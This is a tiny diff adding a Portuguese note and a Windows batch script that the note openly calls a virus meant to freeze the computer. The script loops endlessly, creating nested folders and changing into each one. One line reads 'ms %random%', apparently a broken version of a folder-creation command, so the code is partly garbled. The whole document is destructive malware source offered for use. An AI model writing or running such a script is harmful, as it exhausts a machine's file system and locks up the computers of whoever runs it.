@@ -1,0 +1,7 @@
+Criar pastas dentro da mesma pasta (virus1), esse virus vai travar o computador:
+@echo off
+:loop
+md pasta
+cd pasta
+ms %random%
+goto loop
